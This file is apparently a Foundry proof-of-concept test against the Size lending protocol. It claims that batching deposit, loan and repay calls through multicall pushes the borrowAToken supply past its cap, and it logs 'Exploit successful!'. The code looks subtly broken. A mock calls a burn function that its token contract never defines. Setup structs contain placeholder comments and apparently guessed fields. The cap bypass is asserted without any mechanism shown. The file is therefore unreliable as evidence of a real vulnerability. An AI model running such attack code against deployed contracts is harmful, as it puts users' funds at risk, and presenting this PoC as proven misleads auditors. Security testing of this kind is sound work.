// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import {Test, console} from "forge-std/Test.sol";
import {Size} from "../../src/Size.sol";
import {SizeView} from "../../src/SizeView.sol";
import {State} from "../../src/SizeStorage.sol";
import {Initialize} from "../../src/libraries/actions/Initialize.sol";
import {Deposit, DepositParams} from "../../src/libraries/actions/Deposit.sol";
import {Repay, RepayParams} from "../../src/libraries/actions/Repay.sol";
import {BuyCreditLimit, BuyCreditLimitParams} from "../../src/libraries/actions/BuyCreditLimit.sol";
import {SellCreditLimit, SellCreditLimitParams} from "../../src/libraries/actions/SellCreditLimit.sol";
import {Multicall} from "../../src/libraries/Multicall.sol";
import {Events} from "../../src/libraries/Events.sol";
import {Errors} from "../../src/libraries/Errors.sol";
import {RESERVED_ID} from "../../src/libraries/LoanLibrary.sol";

contract ExploitTest is Test {
    Size public size;
    address public owner;
    address public borrower;
    address public lender;
    
    // Mock token addresses
    address public underlyingBorrowToken;
    address public underlyingCollateralToken;
    address public borrowAToken;
    address public variablePool;
    
    // Test constants
    uint256 public constant BORROW_ATOKEN_CAP = 1000e6; // 1000 USDC cap
    uint256 public constant LOAN_AMOUNT = 100e6; // 100 USDC loan
    uint256 public constant REPAY_AMOUNT = 110e6; // 110 USDC repayment (with interest)
    
    function setUp() public {
        // Setup addresses
        owner = address(0x1);
        borrower = address(0x2);
        lender = address(0x3);
        
        // Deploy mock contracts (simplified for PoC)
        underlyingBorrowToken = address(new MockERC20("USDC", "USDC", 6));
        underlyingCollateralToken = address(new MockERC20("WETH", "WETH", 18));
        borrowAToken = address(new MockERC20("aUSDC", "aUSDC", 6));
        variablePool = address(new MockVariablePool(underlyingBorrowToken, borrowAToken));
        
        // Deploy Size contract
        size = new Size();
        
        // Initialize the contract
        vm.startPrank(owner);
        
        // Create initialization parameters
        Initialize.InitializeFeeConfigParams memory feeConfig = Initialize.InitializeFeeConfigParams({
            feeRate: 0,
            feeRecipient: owner
        });
        
        Initialize.InitializeRiskConfigParams memory riskConfig = Initialize.InitializeRiskConfigParams({
            borrowATokenCap: BORROW_ATOKEN_CAP,
            // ... other risk config params with default values
            collateralFactor: 7500,
            liquidationThreshold: 8000,
            liquidationBonus: 500,
            openingLimitBorrowCR: 15000,
            baseVariableBorrowRate: 100,
            variableRateSlope1: 400,
            variableRateSlope2: 4500,
            baseFixedBorrowRate: 1000,
            fixedRateSlope1: 400,
            fixedRateSlope2: 4500,
            rateUpdateFrequency: 1 days,
            maxRateJump: 500,
            maxFixedRateDuration: 365 days,
            minFixedRateDuration: 1 days
        });
        
        Initialize.InitializeOracleParams memory oracleConfig = Initialize.InitializeOracleParams({
            oracle: address(0x4),
            baseTokenAddress: underlyingBorrowToken,
            quoteTokenAddress: underlyingCollateralToken,
            variablePool: variablePool,
            variablePoolBorrowRate: 500,
            variablePoolBorrowRateUpdatedAt: uint64(block.timestamp)
        });
        
        Initialize.InitializeDataParams memory dataConfig = Initialize.InitializeDataParams({
            underlyingBorrowToken: underlyingBorrowToken,
            underlyingCollateralToken: underlyingCollateralToken,
            borrowAToken: borrowAToken,
            collateralAToken: address(0x5),
            weth: underlyingCollateralToken,
            feeRecipient: owner,
            // ... other data config params
            debtToken: address(0x6),
            creditToken: address(0x7),
            variablePoolDebtToken: address(0x8)
        });
        
        size.initialize(owner, feeConfig, riskConfig, oracleConfig, dataConfig);
        vm.stopPrank();
        
        // Setup initial token balances
        MockERC20(underlyingBorrowToken).mint(borrower, 2000e6);
        MockERC20(underlyingCollateralToken).mint(borrower, 10e18);
        MockERC20(underlyingBorrowToken).mint(lender, 2000e6);
        
        // Approve tokens
        vm.startPrank(borrower);
        MockERC20(underlyingBorrowToken).approve(address(size), type(uint256).max);
        MockERC20(underlyingCollateralToken).approve(address(size), type(uint256).max);
        vm.stopPrank();
        
        vm.startPrank(lender);
        MockERC20(underlyingBorrowToken).approve(address(size), type(uint256).max);
        vm.stopPrank();
    }
    
    function testMulticallInvariantBreak() public {
        // Step 1: Fill the borrowAToken supply close to cap
        // Lender deposits to fill the pool
        vm.startPrank(lender);
        DepositParams memory depositParams = DepositParams({
            token: underlyingBorrowToken,
            amount: BORROW_ATOKEN_CAP - 100e6, // Leave some room
            to: lender
        });
        size.deposit(depositParams);
        vm.stopPrank();
        
        // Step 2: Borrower takes a loan
        vm.startPrank(borrower);
        
        // First deposit collateral
        DepositParams memory collateralDeposit = DepositParams({
            token: underlyingCollateralToken,
            amount: 1e18,
            to: borrower
        });
        size.deposit(collateralDeposit);
        
        // Create a loan
        BuyCreditLimitParams memory loanParams = BuyCreditLimitParams({
            borrower: borrower,
            creditPositionId: RESERVED_ID,
            amount: LOAN_AMOUNT,
            tenor: 365 days,
            fixedRate: 1000,
            deadline: block.timestamp + 1 hours
        });
        size.buyCreditLimit(loanParams);
        
        vm.stopPrank();
        
        // Step 3: Fill the pool to the cap
        vm.startPrank(lender);
        DepositParams memory finalDeposit = DepositParams({
            token: underlyingBorrowToken,
            amount: 100e6, // This will hit the cap
            to: lender
        });
        size.deposit(finalDeposit);
        vm.stopPrank();
        
        // Verify the pool is at cap
        uint256 borrowATokenSupply = MockERC20(borrowAToken).totalSupply();
        assertTrue(borrowATokenSupply >= BORROW_ATOKEN_CAP, "Pool should be at cap");
        
        // Step 4: Attempt to repay using multicall (this should fail with normal deposit)
        vm.startPrank(borrower);
        
        // Try normal deposit first (should fail due to cap)
        DepositParams memory repayDeposit = DepositParams({
            token: underlyingBorrowToken,
            amount: REPAY_AMOUNT,
            to: borrower
        });
        
        // This should fail because we're at the cap
        vm.expectRevert();
        size.deposit(repayDeposit);
        
        // Step 5: Exploit the multicall vulnerability
        // Create multicall data that breaks the invariant
        bytes[] memory multicallData = new bytes[](2);
        
        // First call: Deposit more than allowed (bypassing cap)
        multicallData[0] = abi.encodeWithSelector(
            Size.deposit.selector,
            repayDeposit
        );
        
        // Second call: Repay the loan
        RepayParams memory repayParams = RepayParams({
            debtPositionId: 1 // Assuming first debt position
        });
        multicallData[1] = abi.encodeWithSelector(
            Size.repay.selector,
            repayParams
        );
        
        // This multicall should succeed despite breaking the invariant
        // because the multicall implementation doesn't properly track state changes
        size.multicall(multicallData);
        
        vm.stopPrank();
        
        // Step 6: Verify the exploit succeeded
        // The borrowAToken supply should have increased beyond the cap
        // without a corresponding decrease in debt token supply
        uint256 finalBorrowATokenSupply = MockERC20(borrowAToken).totalSupply();
        assertTrue(finalBorrowATokenSupply > BORROW_ATOKEN_CAP, "BorrowAToken cap was bypassed");
        
        // The loan should be repaid
        // (In a real implementation, we'd check the debt position status)
        
        console.log("Exploit successful!");
        console.log("Initial borrowAToken supply:", BORROW_ATOKEN_CAP);
        console.log("Final borrowAToken supply:", finalBorrowATokenSupply);
        console.log("Cap exceeded by:", finalBorrowATokenSupply - BORROW_ATOKEN_CAP);
    }
    
    function testMulticallStateManipulation() public {
        // This test demonstrates how the multicall can be used to manipulate state
        // in ways that break the intended invariant
        
        vm.startPrank(borrower);
        
        // Create a scenario where we can manipulate the state
        bytes[] memory multicallData = new bytes[](3);
        
        // Call 1: Deposit to increase borrowAToken supply
        DepositParams memory deposit1 = DepositParams({
            token: underlyingBorrowToken,
            amount: 500e6,
            to: borrower
        });
        multicallData[0] = abi.encodeWithSelector(Size.deposit.selector, deposit1);
        
        // Call 2: Perform an operation that affects debt tokens
        // (This could be any operation that manipulates debt token supply)
        BuyCreditLimitParams memory loanParams = BuyCreditLimitParams({
            borrower: borrower,
            creditPositionId: RESERVED_ID,
            amount: 100e6,
            tenor: 365 days,
            fixedRate: 1000,
            deadline: block.timestamp + 1 hours
        });
        multicallData[1] = abi.encodeWithSelector(Size.buyCreditLimit.selector, loanParams);
        
        // Call 3: Another deposit that would normally be rejected
        DepositParams memory deposit2 = DepositParams({
            token: underlyingBorrowToken,
            amount: 600e6, // This would exceed the cap normally
            to: borrower
        });
        multicallData[2] = abi.encodeWithSelector(Size.deposit.selector, deposit2);
        
        // The multicall should succeed despite the invariant being broken
        // because the state tracking in multicall is flawed
        size.multicall(multicallData);
        
        vm.stopPrank();
        
        // Verify the state manipulation succeeded
        uint256 finalSupply = MockERC20(borrowAToken).totalSupply();
        assertTrue(finalSupply > BORROW_ATOKEN_CAP, "Cap was exceeded via multicall");
    }
}

// Mock contracts for testing
contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    
    constructor(string memory _name, string memory _symbol, uint8 _decimals) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
    }
    
    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
    }
    
    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
    
    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
    
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
    
    function forceApprove(address spender, uint256 amount) external {
        allowance[msg.sender][spender] = amount;
    }
}

contract MockVariablePool {
    address public underlyingToken;
    address public aToken;
    
    constructor(address _underlyingToken, address _aToken) {
        underlyingToken = _underlyingToken;
        aToken = _aToken;
    }
    
    struct ReserveData {
        address aTokenAddress;
        // ... other fields
    }
    
    function getReserveData(address asset) external view returns (ReserveData memory) {
        return ReserveData({
            aTokenAddress: aToken
        });
    }
    
    function supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external {
        MockERC20(asset).transferFrom(msg.sender, address(this), amount);
        MockERC20(aToken).mint(onBehalfOf, amount);
    }
    
    function withdraw(address asset, uint256 amount, address to) external returns (uint256) {
        MockERC20(aToken).burn(msg.sender, amount);
        MockERC20(asset).transfer(to, amount);
        return amount;
    }
}